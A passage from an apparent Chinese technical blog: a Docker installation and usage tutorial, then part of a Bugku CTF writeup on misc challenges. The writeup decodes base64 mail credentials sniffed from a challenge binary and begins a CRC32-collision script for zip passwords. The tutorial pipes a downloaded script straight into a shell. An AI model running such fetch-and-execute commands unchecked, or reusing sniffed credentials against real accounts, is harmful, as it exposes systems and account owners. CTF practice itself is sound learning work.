/sys/class/misc/device-mapper</span><br></pre></td></tr></table></figure><p>查看文件是否存在</p><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可，</p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下</p><blockquote><p>Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</p></blockquote><p>由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install curl</span><br><span class="line">apt-get install ca-certificates</span><br><span class="line">apt-get install software-properties-common</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  apt-transprt-https</span><br></pre></td></tr></table></figure><p>安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.nl.debian.org/debian/pool/main/a/apt/apt-transport-https_1.4.8_amd64.deb</span><br><span class="line">dpkg -i apt-transport-https_1.4.8_amd64.deb</span><br><span class="line">wget http://ftp.nl.debian.org/debian/pool/main/a/apt/libapt-pkg5.0_1.4.8_amd64.deb</span><br><span class="line">dpkg -i libapt-pkg5.0_1.4.8_amd64.deb</span><br></pre></td></tr></table></figure><p>添加 Docker 官方的 GPG key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fssl https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将 Docker 的源添加到 /etc/apt/sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><p>更新一下镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker-ce</span><br></pre></td></tr></table></figure><p>开启docker守护进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>运行第一个容器，输出‘hello world’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run centos echo &apos;hello world&apos;</span><br></pre></td></tr></table></figure><h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h3><p>执行安装脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>安装完成后查看版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure><p>开启docker守护进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>运行第一个容器，输出‘hello world’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run centos echo &apos;hello world&apos;</span><br></pre></td></tr></table></figure><p>以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpasswd -a charles docker</span><br></pre></td></tr></table></figure><p>之后重启docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>注销当前账户再重新登录即可运行docker命令啦！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Windows安装比较简单，到网址下载之后按照要求安装即可</p><p><img src="/2018/04/20/docker1/2.jpg" alt=""></p><h1 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h1><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run centos echo &apos;hello world&apos;</span><br></pre></td></tr></table></figure><p>在输出hello world之后镜像也就关闭了，无法交互</p><h2 id="启动交互式容器"><a href="#启动交互式容器" class="headerlink" title="启动交互式容器"></a>启动交互式容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t IMAGE /bin/bash</span><br></pre></td></tr></table></figure><blockquote><p>-i: —interactive=true|默认是false，为容器始终打开标准输入<br>-t: —tty,为容器分配一个伪tty终端</p></blockquote><p>退出交互shell使用 <code>exit</code> 命令</p><h2 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps [-a] [-l]</span><br></pre></td></tr></table></figure><blockquote><p>-a: all<br>-l: latest</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器唯一ID或名字</span><br></pre></td></tr></table></figure><p>该命令可以查看容器的详细信息</p><p><strong>定义容器名字</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name=container01 -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><h2 id="重新启动停止的容器"><a href="#重新启动停止的容器" class="headerlink" title="重新启动停止的容器"></a>重新启动停止的容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start -i 容器名或ID</span><br></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm ..</span><br></pre></td></tr></table></figure><p>注意： 只能删除已经停止的容器</p><h1 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h1><blockquote><p>能够长期运行<br>没有交互式会话<br>适合运行应用程序和服务</p></blockquote><p>以守护形式运行容器</p><p>以下列命令打开一个容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcoker run -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>但是并不以exit命令退出而是以 <code>ctrl P+Q</code>退出，这样容器就会在后台运行</p><p>可以使用 <code>docker ps -a</code> 来查看容器状态可以发下容器确实在后台运行</p><p>使用attach命令再次进入容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach 容器ID</span><br></pre></td></tr></table></figure><p>使用 <code>exit</code> 命令即可退出容器</p><p>启动守护式容器最重要的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名 [command]</span><br></pre></td></tr></table></figure><hr><p>我们来启动一个守护式容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name dc1 -d ubuntu /bin/sh -c &quot;while true;do echo &apos;hello world&apos;; sleep 1; done&quot;</span><br></pre></td></tr></table></figure><p>容器在后台运行，可以使用日志来查看执行情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --tail 0 dc1</span><br></pre></td></tr></table></figure><p>参数的具体含义可在帮助文档中查看</p><p>除了使用logs之外，还可使用进程命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top dc1</span><br></pre></td></tr></table></figure><p>在已经运行的容器中启动新的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec [-d] [-i] [-t] 容器名 [command]</span><br></pre></td></tr></table></figure><p>关闭守护式容器有两种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop dcname</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill dcname</span><br></pre></td></tr></table></figure><p>stop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。</p><hr><p>具体想要查看更多命令的相关情况可以使用man命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man docker-run</span><br><span class="line">man docker-top</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="在docker容器中部署静态网站"><a href="#在docker容器中部署静态网站" class="headerlink" title="在docker容器中部署静态网站"></a>在docker容器中部署静态网站</h1><ol><li>设置容器的端口映射</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run -p|-P</span><br></pre></td></tr></table></figure><blockquote><p>-P: 对容器所有的端口进行映射<br>-p: 指定映射哪些容器的端口</p></blockquote><p><img src="/2018/04/20/docker1/3.jpg" alt=""></p><ol><li>开始部署</li></ol><p>先运行一个带端口映射的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t --name web -p 80 ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>进入容器之后安装Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y nginx</span><br></pre></td></tr></table></figure><p>接下来安装vim，用来编辑网页文件和配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y vim</span><br></pre></td></tr></table></figure><p>新建一个工作目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /var/www/html</span><br></pre></td></tr></table></figure><p>切换到工作目录下,编辑一个静态页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line">vim index.html</span><br></pre></td></tr></table></figure><p>具体编辑过程省略，接下来编辑Nginx配置文件</p><p>查找一下Nginx文件的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>查看文件目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx/sites-enabled</span><br></pre></td></tr></table></figure><p>可以看到有个default文件，修改该文件</p><p>将root的值改为刚才创建的文件目录</p><blockquote><p>root: /var/www/html</p></blockquote><p>这样，配置就完成了，切换回根目录,运行Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>可以使用ps命令查看nginx是否已经运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出</p><p>然后访问静态页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:port</span><br></pre></td></tr></table></figure><p>我们也可以用容器的IP地址来访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect web</span><br></pre></td></tr></table></figure><p>可以看到容器ip地址和映射端口</p><blockquote><p>“IPAddress”: “172.17.0.2”<br>“HostPort”: “32768”</p></blockquote><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.17.0.2</span><br></pre></td></tr></table></figure><p>这就不需要指定端口号了，用默认的80端口即可</p><p>我们停止该容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop web</span><br></pre></td></tr></table></figure><p>然后在打开该服务</p><p>运行 <code>ps -ef</code> 可以看到并没有开启Nginx服务</p><p>这是退出容器</p><p>然后用exec命令开启Nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec web nginx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top web</span><br></pre></td></tr></table></figure><p>可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问</p><p>至此，简单搭建静态页面完成。</p><h1 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h1><p>镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY]</span><br><span class="line">-a,--all=false</span><br><span class="line">-f,--filter //过滤条件</span><br><span class="line">--no-trunc=false //以非截断方式显示镜像信息，默认关闭</span><br><span class="line">-q,--quiet=false</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images centos</span><br></pre></td></tr></table></figure><p>返回docker中对应的centos镜像</p><hr><p>查看镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]</span><br><span class="line">-f,--format=&quot;&quot;</span><br></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [OPTIONS] IMAGE</span><br><span class="line">-f,--force=false //强制删除</span><br><span class="line">--no-prune=false //保留镜像中未打标签的父镜像</span><br></pre></td></tr></table></figure><h1 id="获取和查找镜像"><a href="#获取和查找镜像" class="headerlink" title="获取和查找镜像"></a>获取和查找镜像</h1><h2 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h2><ul><li>Docker Hub</li></ul><blockquote><p>在官方网站上进行搜索</p></blockquote><ul><li>docker search [OPTIOINS] TREM<br>  —automated=false Only show automated builds<br>  —no-trunc=false Don’t truncate output<br>  -s,—stars=0 Only displays with at least stars</li></ul><p><strong>EXAMPLE:</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure><h2 id="获取和推送镜像"><a href="#获取和推送镜像" class="headerlink" title="获取和推送镜像"></a>获取和推送镜像</h2><p><strong><em>拉取镜像</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull [OPTIONS] NAME [:TAG]</span><br><span class="line">-a,--all-tags=false Download all tagged images in the respository</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:14.04</span><br></pre></td></tr></table></figure><p>这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度</p><p>在 <code>daocloud</code> 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高</p><p><strong><em>推送镜像</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push NAME[:TAG]</span><br></pre></td></tr></table></figure><h1 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h1><p>构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境</p><h2 id="使用commit来构建镜像"><a href="#使用commit来构建镜像" class="headerlink" title="使用commit来构建镜像"></a>使用commit来构建镜像</h2><p>创建一个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 80 --name commit_test ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>提交镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a &apos;charles&apos; -m &apos;nginx&apos; 仓库名</span><br></pre></td></tr></table></figure><h2 id="使用dockerfile创建镜像"><a href="#使用dockerfile创建镜像" class="headerlink" title="使用dockerfile创建镜像"></a>使用dockerfile创建镜像</h2><p>自行百度，略</p><h1 id="Docker守护进程的配置与操作"><a href="#Docker守护进程的配置与操作" class="headerlink" title="Docker守护进程的配置与操作"></a>Docker守护进程的配置与操作</h1><h2 id="查看守护进程"><a href="#查看守护进程" class="headerlink" title="查看守护进程"></a>查看守护进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep docker</span><br><span class="line">sudo status docker</span><br></pre></td></tr></table></figure><h2 id="Docker守护进程的停止开始"><a href="#Docker守护进程的停止开始" class="headerlink" title="Docker守护进程的停止开始"></a>Docker守护进程的停止开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop|start|restart</span><br></pre></td></tr></table></figure><p>Docker配置被修改后需要重启才能够生效</p><h2 id="Docker的启动配置文件-配置docker的启动信息"><a href="#Docker的启动配置文件-配置docker的启动信息" class="headerlink" title="Docker的启动配置文件(配置docker的启动信息)"></a>Docker的启动配置文件(配置docker的启动信息)</h2><p>文件位置</p><blockquote><p>/etc/default/docker</p></blockquote><p>利用该文件可以修改docker的各种启动配置信息</p><h1 id="Docker的远程访问"><a href="#Docker的远程访问" class="headerlink" title="Docker的远程访问"></a>Docker的远程访问</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><blockquote><p>第二台安装docker的服务器<br>修改docker守护进程的启动选项以区别服务器<br>保证client API与server API版本一致</p></blockquote><h1 id="Dcoker的容器卷管理"><a href="#Dcoker的容器卷管理" class="headerlink" title="Dcoker的容器卷管理"></a>Dcoker的容器卷管理</h1><ol><li>直接指定文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v ~/datavolume:[ro]/data[:ro] ubuntu /bin/bash</span><br></pre></td></tr></table></figure><blockquote><p>/datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限</p></blockquote><ol><li>创建dockerfile</li></ol><h1 id="Docker容器互联"><a href="#Docker容器互联" class="headerlink" title="Docker容器互联"></a>Docker容器互联</h1><p>分别演示三部分</p><blockquote><p>允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Docker简介&quot;&gt;&lt;a href=&quot;#Docker简介&quot; class=&quot;headerlink&quot; title=&quot;Docker简介&quot;&gt;&lt;/a&gt;Docker简介&lt;/h1&gt;&lt;p&gt;最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。&lt;/p&gt;
    
    </summary>
    
      <category term="资料" scheme="http://chaosec.top/categories/%E8%B5%84%E6%96%99/"/>
    
    
      <category term="docker" scheme="http://chaosec.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>bugku-writeup续</title>
    <link href="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/"/>
    <id>http://chaosec.top/2018/04/03/bugku-writeup续/</id>
    <published>2018-04-03T14:33:55.000Z</published>
    <updated>2019-01-30T11:44:01.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><a id="more"></a><p>先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到</p><blockquote><p>AUTH LOGIN<br>334 VXNlcm5hbWU6<br>YmtjdGZ0ZXN0QDE2My5jb20=<br>334 UGFzc3dvcmQ6<br>YTEyMzQ1Ng==</p></blockquote><p>这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;182100518+725593795416&#125;</span><br></pre></td></tr></table></figure><h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag</p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p>上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 <code>喜欢我吗.</code> 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相）                                                                                    </p><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。</p><h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><p>这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能的图片大小</span></span><br><span class="line"><span class="comment"># (1006 , 61)</span></span><br><span class="line"><span class="comment"># (503 , 122)</span></span><br><span class="line"><span class="comment"># (122 , 503)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">x = <span class="number">503</span></span><br><span class="line">y = <span class="number">122</span></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">line = file.readline()</span><br><span class="line">rgb = line.split(<span class="string">','</span>)</span><br><span class="line">im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>题目给出了一堆二进制数，照常先转为16进制，发现前六位是 <code>526172</code>，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'''</span></span><br><span class="line"><span class="string">0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 这里输入二进制全文，这里只有删除了大部分的内容</span></span><br><span class="line"></span><br><span class="line">b = hex(int(s,<span class="number">2</span>))</span><br><span class="line">a = <span class="string">'52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'</span></span><br><span class="line"><span class="comment"># 16进制全文，注意删除前面的0x字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.rar'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(a.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure><h2 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h2><p>下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span 